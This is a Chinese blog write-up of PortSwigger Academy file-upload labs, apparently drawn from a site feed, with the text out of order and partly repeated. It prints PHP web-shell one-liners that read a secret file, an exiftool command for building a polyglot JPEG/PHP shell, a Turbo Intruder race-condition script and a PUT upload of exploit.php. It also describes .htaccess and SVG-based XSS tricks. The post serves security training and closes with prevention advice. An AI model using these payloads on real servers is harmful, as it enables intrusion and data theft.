<p>不止 Apache，Nginx 和 IIS 也都是要做一些配置才能执行脚本。</p>
<ul class="lvl-2">
<li class="lvl-4">
<p>除了 apache2.conf 这个系统级的配置文件，Apache 服务器允许在每个目录下放置一个 <code>.htaccess</code> 文件，在该文件中添加的指令可以覆盖和补充 apache2.conf 的配置。如果应用程序允许上传 <code>.htaccess</code> ，那么就能利用它绕过安全防护，执行代码。</p>
</li>
<li class="lvl-4">
<p>IIS 服务器也有一个类似的配置文件，名为 <code>web.config</code>，它的指令示例：</p>
<ul class="lvl-4">
<li class="lvl-6">
<p>//.json 文件被当成 json 发送给客户端。</p>
<blockquote>
<staticContent>
    <mimeMap fileextension=".json" mimetype="application/json">
    </mimeMap></staticContent>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>

    </div>
</div>
<h3 id="文件内容验证存在缺陷">文件内容验证存在缺陷</h3>
<p>更安全的服务器会尝试验证文件内容是否与预期相符，而不是隐含地信任请求中指定的 <code>Content-Type</code>。</p>
<p>在图像上传功能中，服务器可能会尝试验证图像的某些固有属性，如尺寸。例如，如果您尝试上传一个 PHP 脚本，它根本不会有任何尺寸。因此，服务器会推断它不可能是图像，并相应地拒绝上传。</p>
<p>同样，某些文件类型的页眉或页脚可能总是包含特定的字节序列。这些序列就像指纹或签名一样，可用于确定文件内容是否与预期类型相符。例如，JPEG 文件总是以 <code>FF D8 FF</code> 字节开始。</p>
<p>这是验证文件类型的一种更稳健的方法，但即便如此也并非万无一失。使用 ExifTool 等特殊工具（Exiftool 工具在 kali 系统中已默认安装），可以轻而易举地创建一个在元数据中包含恶意代码的多格式 JPEG 文件。</p>
<h4 id="Lab-通过多语言网络外壳上传远程执行代码">Lab: 通过多语言网络外壳上传远程执行代码</h4>
<p>本实验室包含一个易受攻击的图片上传功能。虽然它会检查文件内容以验证其是否为真正的图片，但仍有可能上传并执行服务器端代码。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
<p>这道题web应用对上传的文件头做了校验，如果没有识别到预期的特征码就会报错，这种情况下，可以通过exiftool或其他工具来修改文件元数据，插入脚本生成多态jpeg文件进行绕过 exiftool命令：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>不管是直接上传php脚本，还是尝试其他在之前实验室里用过的技术都已经不行了。</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506154133865.png" alt="image-20250506154133865"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>创建一个多语 PHP/JPG 文件，该文件从根本上说是一个普通图像，但在元数据中包含了 PHP 有效载荷。一种简单的方法是下载并从命令行运行 ExifTool，将 PHP 有效载荷添加到图片的注释字段，以 .php 扩展名保存图片，然后上传。如下所示：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exiftool -Comment=<span class="string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> NiuBi.jpg -o polyglot.php</span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250506160513314.png" alt="image-20250506160513314"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将<code>polyglot</code> 上传</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506160911322.png" alt="image-20250506160911322"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>访问就行啦</s>   我靠咋不行，网上的都是jpg，应该是文件格式的问题吧，再用jpg试一下</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163353446.png" alt="image-20250506163353446"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>果然可以了。。。网络的世界真是奇妙</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163844566.png" alt="image-20250506163844566"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        补充
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p>exiftool命令的含义</p>
<ul class="lvl-2">
<li class="lvl-4"><strong><code>exiftool</code></strong>：一个用于读写文件元数据（如EXIF信息）的命令行工具，常用于处理图片的拍摄参数、注释等。</li>
<li class="lvl-4"><strong><code>-Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot;</code></strong>
<ul class="lvl-4">
<li class="lvl-6">将JPEG图片的**注释字段（Comment）**修改为一段PHP代码。</li>
<li class="lvl-6">代码功能：读取服务器上**<code>/home/carlos/secret</code>**文件的内容，并包裹在<code>START</code>和<code>END</code>之间输出。</li>
</ul>
</li>
<li class="lvl-4"><strong><code>-o polyglot.php</code>：<strong>将处理后的文件输出为</strong><code>polyglot.php</code></strong>。生成的文件既是合法图片（保留原JPEG数据），又是PHP脚本（因扩展名为<code>.php</code>且包含可执行代码）。</li>
</ul>
</li>
<li class="lvl-2">
<p>此题上传的文件为 <code>polyglot.php</code> ，当然大部分服务器是不能上传php文件的，但是如果能采用某些方法将jpg解析为php，这段代码依然是可以执行的</p>
</li>
</ul>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        为什么上传png会失败
    </div>
    <div class="spoiler-content">
        <ol>
<li class="lvl-3">
<p><strong>元数据结构的本质差异</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPG（JPEG）</strong>：使用 <strong>EXIF 标准</strong>存储元数据，允许直接将PHP代码写入<code>Comment</code>字段。ExifTool修改后，文件仍保持有效的JPEG结构，同时代码位于可被PHP解析的位置。</li>
<li class="lvl-5"><strong>PNG</strong>：元数据存储在 <strong>“数据块”（Chunks）</strong> 中（如<code>tEXt</code>、<code>iTXt</code>等）。直接通过<code>-Comment</code>参数注入代码可能破坏PNG文件结构，或代码未存储在服务器会解析的位置。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>PHP执行逻辑的差异</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5">即使成功注入代码到PNG中，PHP解析器可能不会执行位于PNG数据块中的代码，因为PHP默认从文件开头解析，遇到非PHP标签（如PNG的二进制头<code>‰PNG</code>）会直接终止执行。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>服务器对文件扩展名的处理</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5">如果上传的PNG文件保留<code>.png</code>扩展名，服务器可能不会调用PHP解析器，即使内容包含PHP代码。而<code>.php</code>扩展名的文件（如你生成的<code>polyglot.php</code>）会被强制用PHP解析。</li>
</ul>
</li>
<li class="lvl-3">
<p>我按照deepseek给我的方法用png进行了尝试，依然失败了。首先我的PHP代码没能写进去（检查时发现的），然后服务端依然没能解析后缀php的png图片。感觉png的安全性应该是比jpg高的。</p>
</li>
<li class="lvl-3">
<p><strong>总的来说：</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPG成功</strong>：因其元数据允许直接注入PHP代码，且生成文件扩展名为<code>.php</code>触发服务器解析。</li>
<li class="lvl-5"><strong>PNG失败</strong>：元数据存储方式不同，且默认扩展名（<code>.png</code>）不触发PHP解析。需调整注入位置或文件结构才能成功。</li>
</ul>
</li>
</ol>

    </div>
</div>
<h3 id="利用文件上传竞赛条件">利用文件上传竞赛条件</h3>
<p>现代框架对此类攻击的防御能力更强。它们通常不会直接将文件上传到文件系统上的目标位置。相反，它们会采取一些预防措施，比如先上传至一个临时的沙盒目录，并随机化名称以避免覆盖现有文件。然后，它们对临时文件进行验证，只有在认为安全后才将文件传输到目的地。</p>
<p>尽管如此，开发人员有时会独立于任何框架实现自己的文件上传处理。要做好这一点不仅相当复杂，还可能引入危险的竞赛条件，使攻击者能够完全绕过最强大的验证。</p>
<p>例如，有些网站会将文件直接上传到主文件系统，如果没有通过验证，就会再次删除。这种行为在依赖反病毒软件等检查恶意软件的网站中非常典型。这可能只需要几毫秒，但在文件存在于服务器上的短时间内，攻击者仍有可能执行该文件。</p>
<p>这些漏洞往往非常隐蔽，因此很难在黑盒测试中发现，除非你能找到泄露相关源代码的方法。</p>
<p>总的来说啊就是：很多文件上传功能不会先将上传的文件上传到目标位置，而是先送去沙盒化临时目录做检查，并随机化它的名称，看看他是不是恶意文件，然后再传到最终目录。但是有的开发者比较疏忽，把文件传到自己的框架目录对它检查。虽然检查的时间很短，但是黑客依然可能利用短短的几毫秒时间搞事情。</p>
<p>另外，还有一种情况可能发生条件竞争文件上传漏洞，就是让用户提供一个 URL 来保存文件，这一般只能由开发人员自己编写处理程序，也必须先下载一份文件副本到本地，然后再做安全性验证，所以这种情况很容易出现漏洞。如果上传的文件或通过 URL 下载的文件保存到一个具有随机名称的临时目录，这一般不太可能被攻击者知道，但如果临时目录是伪随机数，那么仍然有可能被攻击者用暴力破解的方法知道。</p>
<p>为了让条件竞争上传文件的攻击更容易，攻击者会上传一个恶意的大文件，里面填充大量无用字符，但不会影响到里面的代码被执行，应用程序处理这类大文件会处理得更久，那么文件在文件系统上停留的时间更久，也就更容易被攻击者趁机访问。</p>
<h4 id="Lab：-通过竞赛条件上传网络外壳">Lab： 通过竞赛条件上传网络外壳</h4>
<p>该实验室包含一个易受攻击的图片上传功能。虽然它对上传的任何文件都执行了稳健的验证，但利用其处理文件方式中的竞赛条件，完全可以绕过验证。引入这一竞赛条件的脆弱代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//存储目标文件夹名 &#x27;avatars/&#x27;</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;avatars/&quot;</span>;</span><br><span class="line"><span class="comment">//$target_file 是最终保存文件的路径。</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;name&quot;] 是用户上传文件的原始名字（比如用户上传的文件叫 cat.jpg，这里就是 cat.jpg）。</span></span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// temporary move</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;] 是文件上传到服务器后的临时存储路径（比如 &#x27;/tmp/php123.tmp&#x27;）。</span></span><br><span class="line"><span class="comment">//move_uploaded_file 的作用是将临时文件移动到目标路径 $target_file。</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果文件通过了病毒检查(checkViruses)和文件类型检查(checkFileType)，显示上传成功；否则删除文件，显示错误。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">checkViruses</span>(<span class="variable">$target_file</span>) &amp;&amp; <span class="title function_ invoke__">checkFileType</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="comment">//htmlspecialchars：防止文件名中的特殊字符引发安全问题（比如 &lt;script&gt; 这类代码）。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$target_file</span>). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_file</span>);<span class="comment">//删除文件。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);<span class="comment">//返回“禁止访问”的状态码。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkViruses</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// checking for viruses</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查文件扩展名（后缀）是否是 jpg 或 png。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//pathinfo($fileName, PATHINFO_EXTENSION)：提取文件名的后缀（比如 cat.jpg 提取出 jpg）。</span></span><br><span class="line">    <span class="comment">//strtolower：将后缀转为小写（防止 JPG 和 jpg 不一致）。</span></span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>,PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG &amp; PNG files are allowed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><font class="notice">注：我php太菜，直接上注释了</font></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先上传图片，然后添加路径访问图片，确保访问路径正确</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507101849368.png" alt="image-20250507101849368"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>然后构造Tburbo Intruder文件上传竞赛脚本进行攻击，脚本如下</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="number">10</span>,)</span><br><span class="line"></span><br><span class="line">    request1 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    request2 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    engine.queue(request1, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        engine.queue(request2, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>将request1设置为上传php代码的包，将request2设置为上传的php代码的路径。</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507102639395.png" alt="image-20250507102639395"></p>
<h4 id="基于-URL-的文件上传中的竞赛条件">基于 URL 的文件上传中的竞赛条件</h4>
<p>在允许您通过提供 URL 上传文件的函数中，也会出现类似的竞赛条件。在这种情况下，服务器必须通过互联网获取文件并创建本地副本，然后才能执行任何验证。</p>
<p>由于文件是使用 HTTP 加载的，开发人员无法使用框架的内置机制来安全地验证文件。相反，他们可能会手动创建自己的流程来临时存储和验证文件，但这样可能不太安全。</p>
<p>例如，如果文件被加载到一个名称随机的临时目录中，理论上攻击者就不可能利用任何竞赛条件。如果攻击者不知道目录名，就无法请求文件以触发文件的执行。另一方面，如果使用伪随机函数（如 PHP 的 uniqid()）生成随机目录名，就有可能被暴力破解。</p>
<p>为了让这种攻击更容易得手，可以尝试延长处理文件的时间，从而延长暴力破解目录名的时间窗口。一种方法是上传较大的文件。如果文件是分块处理的，你就有可能利用这一点，创建一个恶意文件，在文件开头添加有效载荷，然后添加大量任意填充字节。</p>
<h2 id="利用文件上传漏洞而不执行远程代码">利用文件上传漏洞而不执行远程代码</h2>
<p>在我们迄今为止看过的示例中，我们可以上传服务器端脚本以远程执行代码。这是文件上传功能不安全造成的最严重后果，但这些漏洞仍然可以通过其他方式被利用。</p>
<h3 id="上传恶意客户端脚本">上传恶意客户端脚本</h3>
<p>虽然您可能无法在服务器上执行脚本，但您仍然可以上传脚本进行客户端攻击。例如，如果可以上传 HTML 文件或 SVG 图像，就有可能使用 &lt;script&gt; 标记创建存储的 XSS 有效载荷。</p>
<p>如果上传的文件出现在其他用户访问的页面上，他们的浏览器在尝试呈现页面时就会执行脚本。请注意，由于同源策略的限制，这类攻击只有在上传的文件和您上传文件的同一源提供时才会起作用。</p>
<p>能上传带有恶意代码的文件是最严重的漏洞，这是针对服务器的攻击，但文件上传也能用于针对客户端攻击。上传一个 HTML  文件或 SVG 图像，里面包含 XSS 代码，那么就相当于是一个存储型 XSS 漏洞了，然后把文件的 URL  发给受害者，因为域名是合法的，所以更容易被信任。（注意，上传的文件如果被保存到另一个网站，那么要考虑同源策略的影响）</p>
<h3 id="使用-PUT-上传文件">使用 PUT 上传文件</h3>
<p>值得注意的是，某些网络服务器可能被配置为支持 PUT 请求。如果没有适当的防御措施，即使网络接口没有上传功能，也可以通过这种方式上传恶意文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /images/exploit.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line">Content-Length: <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Tip">Tip</h3>
<p>您可以尝试向不同的端点发送 OPTIONS 请求，以测试是否有任何端点宣布支持 PUT 方法。</p>
<h2 id="如何防止文件上传漏洞">如何防止文件上传漏洞</h2>
<p>允许用户上传文件已是司空见惯的事情，只要采取正确的预防措施，就不会有什么危险。一般来说，保护自己的网站免受这些漏洞攻击的最有效方法是实施以下所有做法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对照允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名。猜测你可能希望允许哪些扩展名要比猜测攻击者可能试图上传哪些扩展名容易得多。</p>
</li>
<li class="lvl-2">
<p>确保文件名不包含任何可能被解释为目录或遍历序列（…/）的子串。</p>
</li>
<li class="lvl-2">
<p>重新命名上传的文件，避免可能导致现有文件被覆盖的碰撞。</p>
</li>
<li class="lvl-2">
<p>在完全验证之前，不要将文件上传到服务器的永久文件系统。</p>
</li>
<li class="lvl-2">
<p>尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。</p>
</li>
</ul>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/shawdow_bug/article/details/140149569">【Portswigger 学院】文件上传</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】文件上传</title>
    <url>/posts/34bab347/</url>
    <content><![CDATA[<h2 id="原理与危害">原理与危害</h2>
<p>文件上传漏洞是指网络服务器允许用户上传文件到其文件系统，而未对文件名、类型、内容或大小等进行充分验证。这就可能导致允许攻击者上传有潜在危险的文件，甚至可能包括支持远程代码执行的服务器端脚本文件。</p>
<p>在某些情况下，上传文件本身就足以造成破坏。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器执行文件。</p>
<span id="more"></span>
<h2 id="文件上传漏洞的影响">文件上传漏洞的影响</h2>
<p>文件上传漏洞的影响通常取决于两个关键因素：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>网站未能正确验证文件的哪个方面，无论是文件大小、类型还是内容等。</p>
</li>
<li class="lvl-2">
<p>文件上传成功后，对文件施加了哪些限制。</p>
</li>
</ul>
<p>在最坏的情况下，文件类型没有得到正确验证，服务器配置允许某些类型的文件（如 .php 和 .jsp）作为代码执行。在这种情况下，攻击者有可能上传一个服务器端代码文件，该文件可作为 web shell 使用，就可以完全控制服务器。</p>
<p>如果文件名没有得到正确验证，攻击者只需上传同名文件，就能覆盖关键文件。如果服务器还存在目录遍历漏洞，这就意味着攻击者甚至可以将文件上传到意想不到的位置，比如覆盖服务器的系统文件。</p>
<p>如果不能确保文件大小在预期的阈值范围内，还可能导致某种形式的拒绝服务（DoS）攻击，即攻击者填满可用磁盘空间。</p>
<h2 id="文件上传漏洞是如何产生的">文件上传漏洞是如何产生的</h2>
<p>因为文件上传漏洞巨大的危害性，网站很少会对允许用户上传的文件不加任何限制。更常见的情况是，开发人员实施他们认为强大的验证，但这种验证要么存在固有缺陷，要么很容易被绕过。</p>
<p>例如，它们可能试图将危险文件类型列入黑名单，但在检查文件扩展名时却没有考虑到解析差异。与任何黑名单一样，黑名单也很容易不小心遗漏更隐蔽的文件类型，而这些文件类型可能仍然具有危险性。</p>
<p>在其他情况下，网站可能会尝试通过验证属性来检查文件类型，而这些属性很容易被使用 Burp Proxy 或 Repeater 等工具的攻击者操纵。</p>
<p>最后，即使是强大的验证措施，在构成网站的主机和目录网络中的应用也可能不一致，从而导致可被利用的差异。</p>
<h2 id="网络服务器如何处理静态文件请求">网络服务器如何处理静态文件请求</h2>
<p>在了解如何利用文件上传漏洞之前，您必须对服务器如何处理静态文件请求有一个基本的了解。</p>
<p>过去，网站几乎完全由静态文件组成，当用户提出请求时，网站就会向用户提供静态文件。因此，每个请求的路径都可以与服务器文件系统中的目录和文件层次结构进行 1:1  的映射。如今，网站越来越动态化，请求的路径往往与文件系统没有任何直接关系。不过，网络服务器仍然要处理一些静态文件的请求，包括样式表、图像等。</p>
<p>处理这些静态文件的流程大致相同。服务器会解析请求中的路径，以确定文件扩展名。然后，服务器根据扩展名和 MIME 类型之间的预配置映射列表来确定请求的文件类型。接下来会发生什么取决于文件类型和服务器配置。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果该文件类型不可执行，如图像或静态 HTML 页面，服务器可能只会在 HTTP 响应中向客户端发送文件内容。</p>
</li>
<li class="lvl-2">
<p>如果文件类型是可执行的，如 PHP 文件，且服务器被配置为执行此类文件，那么在运行脚本之前，服务器会根据 HTTP 请求中的头和参数来分配变量。由此产生的输出结果会在 HTTP 响应中发送给客户端。</p>
</li>
<li class="lvl-2">
<p>如果文件类型是可执行的，但服务器未配置为执行该类型的文件，则通常会响应错误。不过，在某些情况下，文件内容仍会以纯文本形式提供给客户端。这种错误配置偶尔会被利用来泄露源代码和其他敏感信息。</p>
</li>
</ul>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        TIPS
    </div>
    <div class="spoiler-content">
        <p><code>Content-Type</code> 响应头可提供服务器认为它已提供的文件类型的线索。如果应用程序代码没有明确设置该标头，它通常包含文件扩展名/MIME 类型映射的结果。</p>

    </div>
</div>
<h2 id="利用不受限制的文件上传部署网络外壳">利用不受限制的文件上传部署网络外壳</h2>
<p>从安全角度来看，最糟糕的情况是网站允许您上传服务器端脚本（如 PHP、Java 或 Python 文件），并将其配置为代码执行。这样，在服务器上创建自己的网络外壳就变得轻而易举了。</p>
<blockquote>
<p>Web shell</p>
<p>Web shell是一种恶意脚本，攻击者只需向正确的端点发送 HTTP 请求，就能在远程网络服务器上执行任意命令</p>
</blockquote>
<p>如果你能成功上传Web shell，你实际上就拥有了对服务器的完全控制权。这意味着你可以读写任意文件、外泄敏感数据，甚至利用服务器对内部基础架构和网络外的其他服务器进行透视攻击。例如，可以使用下面的 PHP 单行程序从服务器的文件系统中读取任意文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/target/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一旦上传，发送对该恶意文件的请求就会在响应中返回目标文件的内容。</p>
<h4 id="Lab-通过Web-shell-上传远程执行代码">Lab: 通过Web shell 上传远程执行代码</h4>
<p>本实验室包含一个易受攻击的图片上传功能。在将用户上传的文件存储到服务器文件系统之前，它没有对这些文件执行任何验证。</p>
<p>要解决该实验问题，请上传一个基本的<code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>登录题目给的账户后，可以上传头像</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430120836773.png" alt="image-20250430120836773"></p>
<ol start="2">
<li class="lvl-3">
<p>上传1.php文件</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250430120903346.png" alt="image-20250430120903346"></p>
<ol start="3">
<li class="lvl-3">
<p>打开图像</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430121009450.png" alt="image-20250430121009450"></p>
<p>总结：前端无防护、后端无防护、服务器具备执行条件。</p>
<h2 id="利用文件上传验证的缺陷">利用文件上传验证的缺陷</h2>
<p>在网络中，你不太可能发现一个网站像我们在上一个实验室中看到的那样，对文件上传攻击没有任何防护措施。但是，有了防御措施，并不意味着它们就是强大的。有时，你仍然可以利用这些机制中的漏洞来获取网络外壳，从而远程执行代码。</p>
<h3 id="文件类型验证存在缺陷">文件类型验证存在缺陷</h3>
<p>在提交 HTML 表单时，浏览器通常会在 <code>POST </code>请求中发送所提供的数据，内容类型为  <code>application/x-www-form-url-encoded</code>。这对于发送简单的文本（如姓名或地址）很合适。但它不适合发送大量二进制数据，如整个图像文件或 PDF 文档。在这种情况下，首选内容类型为 <code>multipart/form-data</code>。</p>
<p>考虑一个包含上传图片、提供图片说明和输入用户名等字段的表单。提交这样的表单后，可能会得到类似下面的请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /images HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line">    Content-Length: <span class="number">12345</span></span><br><span class="line">    Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------012345678901234567890123456</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;image&quot;</span>; filename=<span class="string">&quot;example.jpg&quot;</span></span><br><span class="line">    Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">    [...binary content of example.jpg...]</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;description&quot;</span></span><br><span class="line"></span><br><span class="line">    This <span class="keyword">is</span> an interesting description of my image.</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line">    wiener</span><br><span class="line">    ---------------------------012345678901234567890123456--</span><br></pre></td></tr></table></figure>
<p>正如你所看到的，消息正文被分割成不同的部分，分别用于表单的每个输入。每个部分都包含一个 <code>Content-Disposition</code>  标头，它提供了与输入字段相关的一些基本信息。这些单独的部分还包含自己的 <code>Content-Type</code> 标头，告诉服务器使用此输入提交的数据的  MIME 类型。</p>
<p>网站尝试验证文件上传的一种方法是检查特定于输入的 Content-Type 标头是否与预期的 MIME  类型相匹配。例如，如果服务器只接收图像文件，它可能只允许图像/jpeg 和图像/png  等类型。当服务器默认信任该标头的值时，就会出现问题。如果不执行进一步的验证来检查文件内容是否真的与假定的 MIME 类型相匹配，就可以使用  Burp Repeater 等工具轻松绕过这一防御。</p>
<h4 id="Lab-绕过内容类型限制上传网络外壳">Lab: 绕过内容类型限制上传网络外壳</h4>
<p>本实验室包含一个易受攻击的图片上传功能。它试图防止用户上传意外的文件类型，但需要依靠检查用户可控输入来验证。</p>
<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>上传PHP代码发现进行了前端防护</p>
</li>
</ol>
